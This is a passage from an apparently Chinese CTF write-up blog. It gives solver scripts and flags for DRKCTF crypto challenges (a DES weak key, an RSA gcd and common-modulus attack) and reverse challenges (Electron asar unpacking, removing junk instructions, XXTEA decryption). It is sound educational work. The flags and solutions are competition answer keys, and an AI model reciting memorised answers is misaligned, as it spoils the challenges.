class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;0101010101010101&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc = des.encrypt(pad(flag,<span class="number">64</span>))</span><br><span class="line"><span class="built_in">print</span>(enc[:enc.find(<span class="string">b&#x27;&#125;&#x27;</span>)+<span class="number">1</span>])</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;We4k_K3y_1s_V3ry_D4nger0us_In_DES&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="MidRSA">MidRSA</h3><div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">这道题没写完</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key1</span>(<span class="params">ebits</span>):</span><br><span class="line">    e = [getPrime(ebits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">message,e</span>):</span><br><span class="line">    n = gmpy2.next_prime(bytes_to_long(message) &lt;&lt; <span class="number">300</span>)</span><br><span class="line">    m = getPrime(<span class="number">256</span>)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_Key2</span>(<span class="params">nbits</span>):</span><br><span class="line">    p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = [random.getrandbits(nbits // <span class="number">4</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">return</span> n,e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">message,e,n</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    c = [<span class="built_in">int</span>(<span class="built_in">pow</span>(m,e[i],n)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e))]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">    </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&quot;DRKCTF&#123;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag1 = flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]</span><br><span class="line">flag2 = flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">ebits = <span class="number">7</span></span><br><span class="line">e1 = generate_Key1(ebits)</span><br><span class="line">cipher1 = encrypt1(flag1,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher1 =&quot;</span>,cipher1)</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">n,e2 = generate_Key2(nbits)</span><br><span class="line">cipher2 = encrypt2(flag2,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cipher2 =&quot;</span>,cipher2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e1 = [109, 71, 109, 73]</span></span><br><span class="line"><span class="string">cipher1 = [36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080, 36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033, 41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871]</span></span><br><span class="line"><span class="string">e2 = [79572758141493570128961125255246129069540961757778793209698370333142346488381, 80555585862127636800866563977080055603517001358195529410497461746213789997225, 44651921320695090688745333790065512192118202496468714141526113242887125432380]</span></span><br><span class="line"><span class="string">cipher2 = [58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057, 16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337, 80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546]</span></span><br><span class="line"><span class="string">n = 93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>第一部分</p>这里有两个c，知道n是m<<300，只要找到模数n，就找到了m，构造$c_i=m^{e_i} \mod n$改写成${c_i}^{e_j}={{m^{e_i}}^{e_j}} ={c_j}^{e_i}\mod n$<p>这样两数之差就是kn，再来一个kn，求gcd即可</p><p>第二部分</p><p>这里重看一下共模攻击和CRT：</p><p><a href="https://www.cnblogs.com/ailanxier/p/13370753.html">中国剩余定理(CRT)及其扩展(EXCRT)详解 - ailanxier - 博客园 (cnblogs.com)</a></p><p>这里要想到三个e对应三个方程，不能简单当成gcd(e1,e2,e3)</p><p>把它当成两次共模攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from prism import *</span></span><br><span class="line"><span class="comment"># from math import *</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e1 = [<span class="number">109</span>, <span class="number">71</span>, <span class="number">109</span>, <span class="number">73</span>]</span><br><span class="line">cipher1 = [<span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">13421582077901767047291741873622169312010984740586925881415103229648835151589774736786336965745532072099996467445790339749720696886313635920080</span>, <span class="number">36272047346364825234770733058042613197790911431212158822254782055957208837848605160852567043492625692783344073921185227328379941291979083011033</span>, <span class="number">41425183140413487232780768389488969603566343428250573532166425276868000949579663990819005141199597640625439816343697426958648927294289659127871</span>]</span><br><span class="line"></span><br><span class="line">d1 = cipher1[<span class="number">0</span>]**e1[<span class="number">1</span>] - cipher1[<span class="number">1</span>]**e1[<span class="number">0</span>]</span><br><span class="line">d2 = cipher1[<span class="number">2</span>]**e1[<span class="number">3</span>] - cipher1[<span class="number">3</span>]**e1[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">n = gcd(d1,d2)</span><br><span class="line"></span><br><span class="line">m1 = n&gt;&gt;<span class="number">300</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(m1))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e2 = [<span class="number">79572758141493570128961125255246129069540961757778793209698370333142346488381</span>, <span class="number">80555585862127636800866563977080055603517001358195529410497461746213789997225</span>, <span class="number">44651921320695090688745333790065512192118202496468714141526113242887125432380</span>]</span><br><span class="line">c2 = [<span class="number">58600444300331800249882073146233995912287198739549440714207984476331259754331716531491187240053630185776787152600165426285021284302994699108557023545574315706006132536588848833818758624067461985444940651823107522770906474037882323326792755635934081822967331031854184791299228513024491344725765476710816941057</span>, <span class="number">16511944800191885973496391252612222059697387587833308714567450121364756390806094606646424594583975159634952911600665271092389815248477961923357683297311169260578508157717777465241680062644118354471550223231057620392252324514411927096940875466794869671163453991620492008856178108060167556176019729800517994337</span>, <span class="number">80885008609388989196377721090246742575908473911131498982960117640742106565184297197238656375198284856442596226398287448931285735903463892735111244609358611618958293002176923706195402338331128766464276441210238388187625107435781170368017908610916585774514676482124401329575553658828115269495158818527164441546</span>]</span><br><span class="line">n = <span class="number">93468142044831350317940409833603031534515663349871776634867176846669780024082517910566484997161088199091160371537367121403194814422867749777235397168852158723228851090445429617275680206703935781244466363279841409768649097588586494453125840436600639420286950914680651600232197982546122764845043227394567787283</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">  g, x, y = egcd(a, m)</span><br><span class="line">  <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">_,s1, s2 = gmpy2.gcdext(e2[<span class="number">0</span>],e2[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c2[<span class="number">0</span>] = modinv(c2[<span class="number">0</span>], n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2[<span class="number">1</span>] = modinv(c2[<span class="number">1</span>], n)</span><br><span class="line"><span class="comment"># print(t)</span></span><br><span class="line">m2 = <span class="built_in">pow</span>(c2[<span class="number">0</span>], s1, n) * <span class="built_in">pow</span>(c2[<span class="number">1</span>], s2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;5d0b96e8-e069-4378-82e7-120e4b761a0b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="REVERSE">REVERSE</h2><h3 id="elec-go">elec_go</h3><p>佬出的题，第一次见</p><p>根据</p><p><a href="https://www.52pojie.cn/thread-1847258-1-1.html">Electron编写的exe 逆向思路 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install asar -<span class="keyword">g</span></span><br><span class="line"><span class="keyword">cd</span> apps</span><br><span class="line">asar extract <span class="keyword">app</span>.asar <span class="keyword">app</span> <span class="comment">//解压拿到源码</span></span><br><span class="line">asar pack <span class="keyword">app</span> <span class="keyword">app</span>.asar <span class="comment">//重新打包</span></span><br></pre></td></tr></table></figure><p>打开js源代码，有一个base64，解密之后发现是aes，但是不知道key，直接写一个</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  dialog.<span class="title function_">showMessageBox</span>(&#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">`k3y 的值是：<span class="subst">$&#123;k3y.toString()&#125;</span>`</span>,</span><br><span class="line">    <span class="attr">buttons</span>: [<span class="string">&#x27;OK&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>重新打包，拿到key的值，在线解密</p><p><img src="https://s2.loli.net/2024/05/30/ugIApJS6XdPciaH.png" alt="image-20240530225931951"></p><h3 id="flower-tea">flower_tea</h3><p>在这里说一下出题思路吧QAQ</p><p>这个题本来是想考一下去花指令的，没想到有佬直接调出来了，tql</p><p>花指令基本都很萌新QAQ，对栈做操作或者call，ret。</p><p>想了一下，可能反调试比花出的还好一点。毕竟x64的和x86有一点不一样。</p><p>感觉还有可以改进的地方：</p><p>隐藏交叉引用-用多级指针来隐藏交叉引用<br>真tea中jmp修正为jz和jnz，这样能起到一些混淆的作用<br>防止附加调试-在scanf之后再次判断调试状态，修改hook</p><p>但是都不会QAQ，还是要好好学，下面抄的官方wp</p><p>观察main函数：<br>主函数的大概是这样。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828856-dd977d3e-329b-4748-adea-648e1ca77d81.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u4cff4822&amp;originHeight=843&amp;originWidth=1134&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=45021&amp;status=done&amp;style=none&amp;taskId=ucfe2b2a2-9d0a-4981-9d9d-5cd31dff461&amp;title=" alt="image.png"><br>如果要调试，要先把第一个函数nop掉（实际上并不用）<br>这里先看encode函数，点开后是爆红的，所以先解花指令<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828863-fffea6a3-e0ed-4f7f-bd78-ba319fdb93b0.png#averageHue=%23242120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u640b1518&amp;originHeight=256&amp;originWidth=819&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=27837&amp;status=done&amp;style=none&amp;taskId=ub41b481a-0633-41c0-9641-9f79986b3f5&amp;title=" alt="image.png"><br>这个是一个简单的jmp花指令，把后面的jmp nop掉，然后可以看到第一部分。<br>这时最上面还是有标红<br>在汇编界面看看哪里还有花<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828840-9379adb2-bb79-47ec-8e66-6b0b6186244b.png#averageHue=%23211f1f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uf2076b9a&amp;originHeight=447&amp;originWidth=1027&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=46966&amp;status=done&amp;style=none&amp;taskId=ue7e65699-3668-4960-a21a-b46ea68bd25&amp;title=" alt="image.png"><br>这里有一个奇怪的call：<br>逻辑是：call完之后把ret的值+0xC然后返回<br>把这一部分按u解除，在加0xC后的位置再反编译<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828855-22c55bc8-7fc2-4b83-8efb-7c1c9f6b986d.png#averageHue=%23222121&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u8a8a33d3&amp;originHeight=902&amp;originWidth=982&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=57530&amp;status=done&amp;style=none&amp;taskId=u0a4f5158-d428-47e8-be3d-870a551763d&amp;title=" alt="image.png"><br>所以ret之后就会到pop的位置<br>把中间这一段全部nop，然后把整个函数u，然后c，再浏览一下函数，中间有一个怪jmp，删掉<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828869-884a2f60-9285-4f64-90a8-423fd0e572e7.png#averageHue=%23383a2d&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u4183dfaa&amp;originHeight=914&amp;originWidth=1121&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=50453&amp;status=done&amp;style=none&amp;taskId=u23ab1c10-a1fa-4e75-af1b-62ab76f52ea&amp;title=" alt="image.png"><br>然后再p，得到解完花的函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall encode(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rcx</span><br><span class="line"> <span class="built_in"> int </span>v3; // eax</span><br><span class="line">  bool v4; // zf</span><br><span class="line"> <span class="built_in"> int </span>v5; // eax</span><br><span class="line"> <span class="built_in"> int </span>v7; // [rsp+2Ch] [rbp-34h]</span><br><span class="line"> <span class="built_in"> int </span>v8; // [rsp+30h] [rbp-30h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>i; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v10; // [rsp+38h] [rbp-28h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v11; // [rsp+3Ch] [rbp-24h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v12; // [rsp+40h] [rbp-20h]</span><br><span class="line"> <span class="built_in"> int </span>v13; // [rsp+44h] [rbp-1Ch]</span><br><span class="line">  _BYTE v15[12]; // [rsp+54h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v15[4] = a1;</span><br><span class="line">  *(_DWORD *)v15 = 0x9E3779B9;</span><br><span class="line">  v8 = 9;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = *(_DWORD *)(a1 + 56);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 -= 0x61C88647;</span><br><span class="line">    v7 = (v10 &gt;&gt; 2) &amp; 3;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 14i64;</span><br><span class="line">     <span class="built_in"> if </span>( i &gt;= 0xE )</span><br><span class="line">        break;</span><br><span class="line">      v12 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * (i + 1));</span><br><span class="line">      v3 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i)</span><br><span class="line">         + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (v12 ^ v10)) ^ (((16 * v11) ^ (v12 &gt;&gt; 3))</span><br><span class="line">                                                                           + ((4 * v12) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">      *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i) = v3;</span><br><span class="line">      v11 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = **(_QWORD **)&amp;v15[4] == 0xEi64;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= 0xEui64;</span><br><span class="line">   <span class="built_in"> if </span>( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)v15;</span><br><span class="line">      **(_QWORD **)&amp;v15[4] += *(_QWORD *)v15;</span><br><span class="line">    &#125;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= v2;</span><br><span class="line">    v5 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64)</span><br><span class="line">       + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (**(_DWORD **)&amp;v15[4] ^ v10)) ^ (((16 * v11) ^ (**(_DWORD **)&amp;v15[4] &gt;&gt; 3))</span><br><span class="line">                                                                                          + ((4 * **(_DWORD **)&amp;v15[4]) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64) = v5;</span><br><span class="line">    v11 = v5;</span><br><span class="line">    --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 );</span><br><span class="line">  v13 = 60;</span><br><span class="line">  while ( v13 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v13;</span><br><span class="line">   <span class="built_in"> if </span>( *(unsigned __int8 *)(*(_QWORD *)&amp;v15[4] + v13) != (byte_7FF7A5187000[v13 + 1] ^ 0x23) )</span><br><span class="line">     <span class="built_in"> return </span>0;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的特征很明显是xxtea，并且没有魔改，网上直接搜脚本<br>exp：(需要用clang)<br>(网上的脚本<a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">https://www.cnblogs.com/zpchcbd/p/15974293.html</a>)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio<span class="number">.</span>h&gt;</span><br><span class="line">#include &lt;stdint<span class="number">.</span>h&gt;</span><br><span class="line">#define DELTA <span class="number">0x9e3779b9</span></span><br><span class="line">#define MX (((z&gt;&gt;<span class="number">5</span>^y&lt;&lt;<span class="number">2</span>) + (y&gt;&gt;<span class="number">3</span>^z&lt;&lt;<span class="number">4</span>)) ^ ((sum^y) + (key[(p&amp;<span class="number">3</span>)^e] ^ z)))</span><br><span class="line"></span><br><span class="line">void btea(uint32_t* v, <span class="keyword">int</span> n, uint32_t const key[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">uint32_t y, z, sum<span class="comment">;</span></span><br><span class="line">unsigned p, rounds, e<span class="comment">;</span></span><br><span class="line">if (n &gt; <span class="number">1</span>)            /* Coding Part */</span><br><span class="line">&#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum += DELTA<span class="comment">;</span></span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = <span class="number">0</span><span class="comment">; p &lt; n - 1; p++)</span></span><br><span class="line">&#123;</span><br><span class="line">y = v[p + <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">z = v[p] += MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>] += MX<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">else if (n &lt; -<span class="number">1</span>)      /* Decoding Part */</span><br><span class="line">&#123;</span><br><span class="line">n = -n<span class="comment">;</span></span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = rounds * DELTA<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = n - <span class="number">1</span><span class="comment">; p &gt; 0; p--)</span></span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[p] -= MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>] -= MX<span class="comment">;</span></span><br><span class="line">sum -= DELTA<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char fakefalg[<span class="number">99</span>] = &#123; 